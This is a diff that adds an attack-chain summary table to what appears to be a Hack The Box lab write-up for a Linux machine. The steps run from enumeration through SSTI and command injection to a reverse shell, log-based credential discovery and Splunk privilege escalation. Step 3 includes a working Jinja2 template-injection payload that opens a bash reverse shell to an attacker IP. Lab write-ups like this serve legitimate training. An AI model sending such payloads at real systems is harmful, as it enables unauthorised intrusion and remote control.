@@ -4,6 +4,20 @@ Difficulty: Easy
 Operating System: Linux
 Hints: True
 ```
+
+### 🏁 Summary of Attack Chain
+
+| Step | User / Access | Technique Used | Result |
+|:---|:---|:---|:---|
+| 1 | (Local) | Nmap Scan, Directory & Virtual Host Enumeration | Identified open ports 22 (SSH), 80 (Apache), and 8089 (Splunk). Discovered a virtual host `doctors.htb` on port 80 which led to a login page with a registration feature. |
+| 2 | (Web) | Server-Side Template Injection (SSTI) or Command Injection | Registered a user on `doctors.htb`. Discovered an SSTI vulnerability by injecting `{{ 7*7 }}` into a new post's title field and observing the output on the `/archive` page. This confirmed the use of a templating engine (Jinja2/Twig). As a secondary method, it was found that the application was vulnerable to command injection via the post title field by observing a `curl` user agent interacting with a local server and then using `$(whoami)` to confirm command execution. |
+| 3 | web | Reverse Shell | **SSTI Method:** Used an SSTI payload `{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"').read()}}` in the post title to get a reverse shell. \<br\> **Command Injection Method:** Used `curl` to download and execute a reverse shell script, also obtaining a shell. |
+| 4 | web | Log File Analysis | Found that the user `web` was a member of the `adm` group, which has read access to log files. By examining the `/var/log/apache2/backup` file, a password `Guitar123` was discovered from a password reset attempt for the user `shaun`. |
+| 5 | shaun | SSH Login | Used the password `Guitar123` to log in as the user `shaun` via SSH. |
+| 6 | root | Splunk Privilege Escalation (CVE-2020-10118) | Identified a running Splunk service on port 8089 as `root`. Used the `shaun` credentials to log in. Found that the Splunk version (8.0.5) was vulnerable to a remote code execution exploit (SplunkWhisperer2). Executed the exploit to gain a root shell. |
+
+
+
 ## Initial Enumeration
 Running nmap scan (TCP) on the target shows the following results:
 ```
